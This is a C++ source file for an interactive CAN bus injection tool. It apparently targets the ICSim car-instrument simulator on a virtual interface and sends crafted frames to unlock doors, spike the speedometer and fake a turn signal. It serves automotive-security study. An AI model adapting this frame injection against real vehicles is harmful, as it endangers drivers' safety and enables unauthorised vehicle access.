#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include "CANClient.h"

void print_menu() {
    std::cout << "\n=========================================" << std::endl;
    std::cout << "      Automotive CAN Attack Menu         " << std::endl;
    std::cout << "=========================================" << std::endl;
    std::cout << "  1. Unlock Doors (ID: 0x19B)" << std::endl;
    std::cout << "  2. Spike Speedometer (ID: 0x244)" << std::endl;
    std::cout << "  3. Left Turn Signal (ID: 0x188)" << std::endl;
    std::cout << "  0. Exit Tool" << std::endl;
    std::cout << "=========================================" << std::endl;
    std::cout << "Select a payload to inject: ";
}

int main() {
    CANClient injector("vcan0");

    if (!injector.init()) {
        std::cerr << "Initialization failed. Exiting." << std::endl;
        return 1;
    }

    int choice;
    bool running = true;

    while (running) {
        print_menu();
        std::cin >> choice;

        switch (choice) {
            case 1: {
                // ICSim Door Unlock: Byte 2 is 0x0E
                std::vector<uint8_t> payload = {0x00, 0x00, 0x0E, 0x00};
                std::cout << "Executing Replay Attack: Door Unlock..." << std::endl;
                for(int i=0; i<3; i++) { // Send 3 times to ensure it hits
                    injector.send_frame(0x19B, payload);
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                }
                break;
            }
            case 2: {
                // ICSim Speedometer: Bytes 3 and 4 control the needle
                std::vector<uint8_t> payload = {0x00, 0x00, 0x00, 0xFF, 0xFF};
                std::cout << "Executing Fuzzing Attack: Speedometer Spike..." << std::endl;
                for(int i=0; i<10; i++) { // Send rapidly to fight the real ECU
                    injector.send_frame(0x244, payload);
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
                break;
            }
            case 3: {
                // ICSim Turn Signal: Byte 0 is 0x01
                std::vector<uint8_t> payload = {0x01, 0x00, 0x00, 0x00};
                std::cout << "Executing Spoofing Attack: Left Turn Signal..." << std::endl;
                injector.send_frame(0x188, payload);
                break;
            }
            case 0:
                std::cout << "Exiting tool." << std::endl;
                running = false;
                break;
            default:
                std::cout << "Invalid selection. Try again." << std::endl;
        }
    }

    return 0;
}
